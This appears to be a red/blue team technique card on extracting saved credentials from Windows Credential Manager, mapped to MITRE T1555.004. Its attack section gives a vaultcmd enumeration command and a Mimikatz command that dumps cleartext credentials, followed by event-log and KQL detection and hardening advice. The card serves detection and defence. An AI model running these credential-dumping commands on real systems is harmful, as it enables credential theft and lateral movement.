# [CA-STORE-003]: Windows Credential Manager Vault Extraction

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-STORE-003 |
| **MITRE ATT&CK v18.1** | [Credentials from Password Stores: Windows Credential Manager (T1555.004)](https://attack.mitre.org/techniques/T1555/004/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows Endpoint |
| **Severity** | **Medium** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Windows Credential Manager (`vaultcmd.exe`) stores "Generic Credentials" and "Web Credentials" for applications like Outlook, Teams, and RDP. Attackers can execute code in the user's context to dump these vaults.
- **Attack Surface:** User process space.
- **Business Impact:** **Lateral Movement**. Often contains credentials for file shares or RDP hosts.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** User Access (Interactive).
- **Tools:**
    - [Mimikatz](https://github.com/gentilkiwi/mimikatz)
    - `vaultcmd` (Native)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Enumeration (Native)**
List stored credentials.
```cmd
vaultcmd /listcreds:"Windows Credentials"
```

**Step 2: Dump (Mimikatz)**
Extract cleartext.
```powershell
.\mimikatz.exe "sekurlsa::credman" "exit"
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Event Logs
| Source | Event ID | Filter Logic |
|---|---|---|
| **Security** | 5379 | Credential Manager credentials were read. |

#### 5.2 Sentinel (KQL)
```kusto
// Focus on non-standard processes reading CredMan
SecurityEvent
| where EventID == 5379
| where ProcessName !in ("C:\\Windows\\System32\\svchost.exe")
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Credential Guard:** Helps protect domain credentials but Generic Credentials (e.g., for a specific website) are often still retrievable if code execution exists in the user session.
*   **ASR Rule:** Block credential stealing from the Windows local security authority subsystem.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-PHISH-005]
> **Next Logical Step:** [LAT-SMB-001]
